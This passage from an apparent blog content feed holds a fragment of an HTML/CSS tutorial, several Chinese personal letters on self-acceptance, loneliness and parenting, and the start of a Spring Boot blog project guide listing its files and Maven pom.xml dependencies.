class="string">&quot;EN&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>标题<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 进行各个浏览器样式的统一 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./readne.css&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
          <category> 程序 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教学文档 </tag>
            
            <tag> Css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【無憂樹洞】醒来，然后去活成你真正想要的样子</title>
      <link href="/2021/09/01/epistle.2021.9.1.01/"/>
      <url>/2021/09/01/epistle.2021.9.1.01/</url>
      
        <content type="html"><![CDATA[<p>我今天被一波能量推动，写下这些文字，尽管我并不确定最终的成文会是什么样子，但是我愿意顺应这样的能量流动，愿意如此真实的面对自己，面对你，面对存在。</p><p>醒来，如同艾米丽唱的醒来。</p><p>你也许听过这样的说词，</p><p>有些人活者，却从未活过。</p><p>有些人活着，却已经死去。</p><p>一个人怎样才算醒来？真的有人是沉睡的吗？</p><p>如果你从未思考过人生，你不会醒来。</p><p>当你开始思考人生，你就一定会醒来。</p><p>总会有某个时刻，</p><p>总会在某个时刻，</p><p>你开始认真的思考：</p><p>你是谁，你活着为了什么，生命对于你而言有什么意义，你要如何活着，你要如何存在。。。</p><p>当你开始思考，当你开始这样问自己，或者问苍天，你就会醒来。</p><p>人生对于你，生活对于你，生命对于你，就已经开始不同。</p><p>无论最终，这一生，你是不是可以找到属于自己的答案，都已经开始不同。</p><p>活着，你想要活成什么样子，</p><p>什么是你真正想要的样子？</p><p>就这个问题，从我真的开始问出这个问题，到今年，我探索了七年。</p><p>我不能说，我已经可以有一个非常明确的答案，但是我有了很多越来越清晰的方向、线索，</p><p>也在这个过程中，一点一点在积累内在的力量，</p><p>这些如同种子，被播撒，在合适的时间，它们会发芽生长。</p><p>如果你还不知道，我真心的想要告诉你，我这样天天在捣鼓这个问题的人，都走了那么多年，</p><p>如果你花了更少的时间或者更多的时间，都没关系，都别着急。</p><p>走吧，继续走吧，会知道方向的，也别错失一路的风景。</p><p>且行且珍惜，且行且欣赏。</p><p>我没有办法告诉你，你想要活成的样子是什么样子，</p><p>因为每个人的这条路，是独一无二的，是私人定制。</p><p>但是我可以跟你分享一些我走过的风景，</p><p>以及一些也许可以称之为经验的东西，</p><p>为了我们各自继续的路，与你共勉。</p><p>你要去的地方，没人会真正知道，除了你。</p><p>如果你也不知道，不要急，只要你想，你一定会知道的。</p><p>要始终相信这一点。</p><p>这趟旅程，没有“别人”的标准，没有“别人”的评价，</p><p>如果你还因为别人的标准或者评价，各种动荡，</p><p>那么，你还没有上路，</p><p>你还没有走在通往自己的神圣之地的路上。</p><p>如果任何人的评价和标准，都不在成为影响你，动摇你的因素，</p><p>如果任何人的评价和标准，你都会心一笑，接受生命各种形式的善意，</p><p>然后依然看起来固执己见，</p><p>我想要非常肯定的告诉你，很好，继续。</p><p>当然，更重要的是，你内在，有这样的笃定，：</p><p>你知道，你在哪里了，你知道你要去哪里了，</p><p>此时，你上路了。</p><p>如果你活成了一个另类，</p><p>你发现你越来越孤独，没有什么人可以理解你，</p><p>你发现你的社交圈越来越窄，几乎没有社交，</p><p>你发现你太格格不入了，</p><p>你怀疑自己可能有各种问题，因为太不合群了。</p><p>我想要非常肯定的告诉你，很好，继续。</p><p>优秀和卓越的都不是寻常人，即便你不优秀也不卓越，你还是独特的你。</p><p>成为独特的你，把你的独特性活出来，你怎么会和“大多数”合群。</p><p>而当你开始接受你的独特性，勇敢的展现出来，</p><p>你一定又会遇见更多“独特“的小众。</p><p>在这条路上，你一定会不断的更新你周围的社交关系，</p><p>甚至不断更新各种被教导的”常识“。</p><p>如果你是一个独特的存在，怎么会有任何模板？</p><p>你喜欢的东西，你适合的东西，你的存在，</p><p>都需要你自己不断的了解和确认。</p><p>如果大众的适合你，你就成了大众。</p><p>所以不要害怕自己活成了一个异类。</p><p>我会跟我很多的个案重复这句话：</p><p>你很好，你很独特，所以你一定会遇见不合群的尴尬。</p><p>你很独特，所以你真的可能会成为大众的异类。</p><p>放心，大胆的走下去吧。</p><p>有一天，你会为自己的独特骄傲。</p><p>有一天，你会为自己活出了一个异类而自豪。</p><p>有一天，你会心甘情愿且无比安心的成为一个低调的异类。</p><p>哈哈。。这是真的，你要相信。</p><p>不要在任何关系中慌乱、责备自己不够好。</p><p>回来，回来，回来。</p><p>回到自己和自己的关系。</p><p>这是我们唯一的、全部的功课。</p><p>多花一些时间在自己的身上。</p><p>享受独处的时光。</p><p>如果没有人了解你，就了解自己。</p><p>如果没有人爱你，就爱自己。</p><p>如果没有人照顾你，就照顾自己。</p><p>然后，某天你会发现，</p><p>当你足够了解自己，你就了解了其他人和世界。</p><p>当你真的开始爱自己，你就可以真心的爱周围的人和世界。</p><p>也许你会说，我不知道，要怎么爱自己。</p><p>把你的双手，放在胸口，时不时的问自己：想要什么，想要怎样，什么感觉。</p><p>就这么简单。</p><p>开始对自己诚实，</p><p>开始从可以为自己做的一件很小很小的事情，</p><p>开始触摸自己的身体，</p><p>开始和自己对话，</p><p>开始，开始，开始。</p><p>用你的双手，堵上耳朵，关掉所有周围对你的评价的声音。</p><p>慢慢了解自己，慢慢自己评价自己，慢慢问自己对一切的认知。</p><p>你在你的世界，你就是王，你就是你自己的标准，唯一的标准。</p><p>用你的双手，蒙上眼睛，闭上眼睛，用心里的眼睛去看，去感觉。</p><p>信任心里的这双眼睛，信任内心的感觉。</p><p>开心的时候，允许自己开心。</p><p>伤心的时候，允许自己哭泣。</p><p>不安的时候，允许自己恐惧。</p><p>感觉，感觉，再感觉。</p><p>如同闻到鲜花的芬芳，如同看见日出日落，如同听见鸟儿欢唱，</p><p>如同尝到香甜的美味，如同触摸自己的肌肤，如同环抱自己的膝盖。</p><p>你所能感觉到的一切，都值得信任。</p><p>用你的双手，触摸自己的胸口、小腹身体的任何部位，</p><p>你能感受到的掌心的温度，</p><p>就是身体给你的爱，就是你给自己的爱。</p><p>爱自己，就那么简单。</p><p>在你感觉冷的时候，感觉孤单无助的时候，感觉紧张兴奋的时候，</p><p>任何时候，通过双手，碰触身体任何部位，</p><p>这便是身体与心的连接。</p><p>这便是宇宙与你的连接。</p><p>掌心的温度，便是你的爱，宇宙的支持。</p><p>如果手很冷，就搓搓，摩擦生热：）</p><p>最后，还有一点，无论你现在在哪里，要去哪里，</p><p>走下去，走下去，走下去。</p><p>无论停下来多久，记得，继续走下去。</p><p>无论是黑暗或者阴暗，记得，起来，继续走下去。</p><p>你要的一切，</p><p>你困惑的一切，</p><p>你未知的一切，</p><p>要走下去，要动起来，要行动，</p><p>才会真正发生。</p><p>不要害怕，不要怀疑，不要放弃。</p><p>因为在这不同的路，相同的道，</p><p>你，并不独孤。</p><p>我在，</p><p>我们，在一起。</p><p>还有，从未离开和消失的，源头。</p><hr><p><strong>我只是在呢喃自语，</strong></p><p><strong>如果你看了，就已经是一种见证和陪伴了，</strong></p><p><strong>因为我知道一定会有人看。</strong></p><p><strong>如果有什么信息能和你共鸣，</strong></p><p><strong>你从中看见了自己，</strong></p><p><strong>那就是另外的收获了。</strong></p><p><strong>如果你看懂了，</strong></p><p><strong>你从中看见了我，</strong></p><p><strong>还能有什么回应，</strong></p><p><strong>并且这回应我们还可以彼此共振，</strong></p><p><strong>那就是更大的惊喜了。</strong></p><p><strong>没有无缘无故的遇见。</strong></p><p><strong>致敬未知。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 书信 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小柔书信 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【無憂樹洞】陪伴</title>
      <link href="/2021/08/31/epistle.2021.8.31.03/"/>
      <url>/2021/08/31/epistle.2021.8.31.03/</url>
      
        <content type="html"><![CDATA[<p>亲爱的，今天你过的好吗？</p><p>大部分时候，给你写信，还是自言自语的更多，不像是在跟你说话，尽管我总是让信件看起来仿佛在与你对话。</p><p>然后我觉得，与你对话，仿佛自言自语，是一种敞开与坦诚。而，这的确不是一场对话。从你收到我的第一封信开始，你就知道这一点了吧。不过我的头脑，也始终会有一个问题，在关系中，我们是否需要对话？虽然所有的对话也只是不同形式的自言自语，因为我们只会看见投射，不会看见真实的彼此。放开头脑的问题，心是自由的，心是没有问题的，心只会做祂想要做的，心更注重内心的感觉。</p><p>我最近有打坐，今天开始还起早打坐了，因为白天太忙了，没有足够的时间。我的头脑也会犹豫和纠结，我究竟是要按照师傅的功法继续练，还是要放弃。因为我能感觉到身体不喜欢那个刻意的意守丹田，身体更喜欢自然的，体内气血自然的流动。我也不知道，我是该给气血一些规矩，道路，去刻意的引导气的流动，还是应该让他们顺其自然。我知道这只是方式的不同，其实无论哪个方式，心无挂碍的去做就行，我这不就是心有挂碍，不知道该如何，我要再想想，再感觉感觉。</p><p>今天还和孩子发脾气了，我很少发脾气，也很少大声吼他，也很少说教他。不过今天早上吼了他一次，晚上又巴拉巴拉说了一些。我看见我自己的担心，担心他不学无术，每天玩游戏刷抖音以后越来越差，不仅仅是成绩差，学习态度也随便，还懒…总之也没什么好习惯，我自己是很不讲究这些规矩的，但是起码我勤奋，态度端正，该做的事情一定是靠谱的做。我也会纠结和顾虑关于孩子的教育，究竟什么要管，什么可以不管，这个尺度何止智慧两个字。但是我看到更深的担心是，我害怕和担心被别人说，被别人评价我这样为人妈是不行的，是不可以的，是不好的。如果没有人会评价我，父母，前夫，闺蜜，甚至不相关的人，如果没有评价的标准，可能我真的什么都不会做。而未来孩子也会长大，社会系统还是有评价，顺带评价孩子他妈。嗯，我就是很不愿意被人说当妈的不行，哈~这个部分还很值得深入的挖挖。我一直觉得，教育不过是先把自己过好了。一个生命影响另一个生命，那是极其自然的事情。还是能感觉到这个部分，我还是有很多很深的情绪的呀</p><p>今天看到国外的一个疫情的新闻报道，说的是陪伴犬的故事。人这种动物是需要被触摸，被拥抱，需要肌肤接触，需要无条件的爱与接纳，需要被抱持。有时候觉得宠物陪伴的很大能量是，它们不会说话，没有言语的消耗。语言就是一种能量武器呢，哈哈。而且人的场比动物的场更复杂。你一定遇到过一些人，你待在他身边，不说话，都觉得很舒服。反之，也有一些人，靠近就不舒服。</p><p>谢谢你这段日子的陪伴。</p><p>无论你是不是给我写过信，这份陪伴的场和能量也是在的。好吧，你也要谢谢我吗？我收到你的谢谢了。</p><p>深入自己是很难的。经过这段时间，我想我已经准备好，自己一个人去走更深的路了。我打算花更多的时间，深入自己，解剖自己。而这个过程可能真的更自我，更自言自语。谢谢你陪我走到了这里。下面的路，只能我自己去走。</p><p>我的豆瓣会不定期更新，如果你对我的自言自语依然有兴趣。</p><p>我也会继续给你写信，跟你道晚安，像熟悉的老朋友那样问候你，告诉你我的近况，我眼里的世界，以及新奇的故事。只不过，会从每天，调整为不定期。</p><p>相信你会更多的祝福我，因为这表示，我终于准备好，自己一个人，去走更深的路，也表示我成长了，而且还会不断的持续的成长。</p><p>晚安，亲爱的，这是我第45天跟你道晚安。</p><hr><p><strong>我只是在呢喃自语，</strong></p><p><strong>如果你看了，就已经是一种见证和陪伴了，</strong></p><p><strong>因为我知道一定会有人看。</strong></p><p><strong>如果有什么信息能和你共鸣，</strong></p><p><strong>你从中看见了自己，</strong></p><p><strong>那就是另外的收获了。</strong></p><p><strong>如果你看懂了，</strong></p><p><strong>你从中看见了我，</strong></p><p><strong>还能有什么回应，</strong></p><p><strong>并且这回应我们还可以彼此共振，</strong></p><p><strong>那就是更大的惊喜了。</strong></p><p><strong>没有无缘无故的遇见。</strong></p><p><strong>致敬未知。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 书信 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小柔书信 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【無憂樹洞】幸福的感觉</title>
      <link href="/2021/08/31/epistle.2021.8.31.02/"/>
      <url>/2021/08/31/epistle.2021.8.31.02/</url>
      
        <content type="html"><![CDATA[<p>嗨，你今天过的好吗？</p><p>你在什么时候，会有幸福的感觉？</p><p>晒太阳，好幸福。哈哈。</p><p>忍不住想要跟你分享这样的幸福。</p><p>躺在瑜伽垫上，趴着，露着脚丫子，一定要光脚呢，太阳可以晒到整个身体。一会儿还可以翻身，仰面朝天，用衣服盖住眼睛。</p><p>太阳晒在身上，热热的感觉，就像水波一样，一阵一阵的，难怪会有一个词叫做热浪。</p><p>感受太阳的能量，感受太阳的温热进入身体，是一阵一阵的能量，特别舒服 。</p><p>这真是一种特别简单的幸福，好像一瞬间就变成了一棵树，或者一朵花，也没有任何的思考，只是存在。</p><p>最近这一周的学习，信息量很大，还需要花很多时间消化和练习。</p><p>忙碌的时候，感觉时间过得更快。</p><p>希望你一切都好。</p><p>晚安，亲爱的，这是我第26天跟你道晚安</p><hr><p><strong>我只是在呢喃自语，</strong></p><p><strong>如果你看了，就已经是一种见证和陪伴了，</strong></p><p><strong>因为我知道一定会有人看。</strong></p><p><strong>如果有什么信息能和你共鸣，</strong></p><p><strong>你从中看见了自己，</strong></p><p><strong>那就是另外的收获了。</strong></p><p><strong>如果你看懂了，</strong></p><p><strong>你从中看见了我，</strong></p><p><strong>还能有什么回应，</strong></p><p><strong>并且这回应我们还可以彼此共振，</strong></p><p><strong>那就是更大的惊喜了。</strong></p><p><strong>没有无缘无故的遇见。</strong></p><p><strong>致敬未知。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 书信 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小柔书信 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【無憂樹洞】晚安</title>
      <link href="/2021/08/31/epistle.2021.8.31.01/"/>
      <url>/2021/08/31/epistle.2021.8.31.01/</url>
      
        <content type="html"><![CDATA[<p>听课有点累了。</p><p>我准备睡觉了。</p><p>希望你今天过得好。</p><p>还是要跟你说晚安。祝你今夜无梦。</p><p>这是我第27天跟你道晚安。</p><hr><p><strong>我只是在呢喃自语，</strong></p><p><strong>如果你看了，就已经是一种见证和陪伴了，</strong></p><p><strong>因为我知道一定会有人看。</strong></p><p><strong>如果有什么信息能和你共鸣，</strong></p><p><strong>你从中看见了自己，</strong></p><p><strong>那就是另外的收获了。</strong></p><p><strong>如果你看懂了，</strong></p><p><strong>你从中看见了我，</strong></p><p><strong>还能有什么回应，</strong></p><p><strong>并且这回应我们还可以彼此共振，</strong></p><p><strong>那就是更大的惊喜了。</strong></p><p><strong>没有无缘无故的遇见。</strong></p><p><strong>致敬未知。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 书信 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小柔书信 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于Spring-Boot的博客开发系统</title>
      <link href="/2021/08/29/Spring_Blog/"/>
      <url>/2021/08/29/Spring_Blog/</url>
      
        <content type="html"><![CDATA[<h1 id="基于Spring-Boot网站架构参考"><a href="#基于Spring-Boot网站架构参考" class="headerlink" title="基于Spring Boot网站架构参考"></a>基于Spring Boot网站架构参考</h1><p>文件说明：</p><table><thead><tr><th>文件名称</th><th>文件说明</th></tr></thead><tbody><tr><td>pom.xml</td><td>项目配置文件</td></tr><tr><td>in.md</td><td>开发参考说明文档</td></tr><tr><td>application.yml</td><td>SpringBoot开发环境配置文件(公共环境下配置)</td></tr><tr><td>application-pro.yml</td><td>SpringBoot开发环境配置文件(生产环境下配置)</td></tr><tr><td>application-dev.yml</td><td>SpringBoot开发环境配置文件(开发环境下配置)</td></tr><tr><td>logback-spring.xml</td><td>日志模块配置文件</td></tr><tr><td>404.html</td><td>404错误页面</td></tr><tr><td>505.html</td><td>505错误页面</td></tr><tr><td>error.html</td><td>BeBug页面</td></tr><tr><td>blogs.html</td><td>后台管理页面</td></tr><tr><td>blogs-input.html</td><td>博客后台发布页面</td></tr><tr><td>type.html</td><td>后台分类管理页面</td></tr><tr><td>type-input.html</td><td>后台分类新增页面</td></tr><tr><td>about.html</td><td>关于我页面</td></tr><tr><td>archives.html</td><td>归档页面</td></tr><tr><td>blog.html</td><td>博客详情页面</td></tr><tr><td>index.html</td><td>博客首页</td></tr><tr><td>tags.html</td><td>标签页面</td></tr><tr><td>type.html</td><td>分类页面</td></tr><tr><td>login.html</td><td>登录页面</td></tr><tr><td>search.html</td><td>搜索页面</td></tr><tr><td>_fragments.html</td><td>动态页面 定义Thymeleaf片段</td></tr><tr><td>IndexController.java</td><td>Web控制器</td></tr><tr><td>LoginController.java</td><td>WEB登录模块控制器</td></tr><tr><td>BlogController.java</td><td>Blog后台页面权限过滤管理类</td></tr><tr><td>TypeController.java</td><td>Web层分类模块操作</td></tr><tr><td>TagController.java</td><td>Web层标签模块操作</td></tr><tr><td>CommentController.java</td><td>评论模块处理</td></tr><tr><td>TypeShowController.java</td><td>分类模块处理</td></tr><tr><td>TagShowController.java</td><td>标签模块处理</td></tr><tr><td>ArchiveShowController.java</td><td>归档模块处理</td></tr><tr><td>AboutShowController.java</td><td>个人模块处理</td></tr><tr><td>LongInterceptor.java</td><td>Blog后台页面权限(登录过滤)类</td></tr><tr><td>WebConfig.html</td><td>Blog后台页面权限(拦截配置) 类</td></tr><tr><td>ControllerExceptionHandler.java</td><td>BeBug拦截器</td></tr><tr><td>NotFoundException.java</td><td>异常类，业务相关（如果没有页面报错404）</td></tr><tr><td>Blog.java</td><td>Blog实体类</td></tr><tr><td>Type.java</td><td>分类实体类</td></tr><tr><td>Tag.java</td><td>标签实体类</td></tr><tr><td>Comment.java</td><td>评论实体类</td></tr><tr><td>User.java</td><td>用户实体类</td></tr><tr><td>UserService.java</td><td>User登录业务逻辑处理接口类</td></tr><tr><td>UserServiceImpl.java</td><td>User登录业务逻辑处理实现类</td></tr><tr><td>TypeService.java</td><td>分类业务逻辑处理接口</td></tr><tr><td>TypeServiceImpl.java</td><td>分类业务逻辑处理实现类</td></tr><tr><td>TagService.java</td><td>标签业务逻辑处理接口</td></tr><tr><td>BlogService.java</td><td>博客业务逻辑处理接口</td></tr><tr><td>BlogServiceImpl.java</td><td>博客业务逻辑处理实现类</td></tr><tr><td>TagServiceImpl.java</td><td>标签业务逻辑处理实现类</td></tr><tr><td>CommentService.java</td><td>评论业务逻辑处理接口</td></tr><tr><td>CommentServiceImpl.java</td><td>评论业务逻辑处理实现类</td></tr><tr><td>UserRepository.java</td><td>引用SpringJPA SQL操作接口</td></tr><tr><td>TypeRepository.java</td><td>分类业务处理 SQL操作接口</td></tr><tr><td>TagRepository.java</td><td>标签业务处理 SQL操作接口</td></tr><tr><td>BlogRepository.java</td><td>博客业务处理 SQL操作接口</td></tr><tr><td>CommentRepository.java</td><td>评论业务处理 SQL操作接口</td></tr><tr><td>BlogQuery.java</td><td>博客搜索查询类</td></tr><tr><td>MD5Utils.java</td><td>MD5加密类</td></tr><tr><td>MyBeanUtils.java</td><td>修复SQL数据修改后为null工具类(过滤掉数据值为null)</td></tr><tr><td>MarkdownUtils.java</td><td>Markdown转换HTML工具类</td></tr><tr><td>messages.properties</td><td>数据配置文件</td></tr></tbody></table><p>项目配置(Jar包)</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.cxkj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>blog<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>blog<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Demo project for Spring Boot<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tymeleaf.version</span>&gt;</span>3.0.2.RELEASE<span class="tag">&lt;/<span class="name">tymeleaf.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tymeleaf-layout-dialect.version</span>&gt;</span>2.1.1<span class="tag">&lt;/<span class="name">tymeleaf-layout-dialect.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-aop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-jpa<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-devtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>后面导入的Jar包(新版本原因曾经的Jar不包含了)</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.validation<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>validation-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.hibernate<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hibernate-validator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.0.13.Final<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Markdown转换HTML第三方Jar包配置</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.atlassian.commonmark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commonmark<span class="tag">&lt;/<span 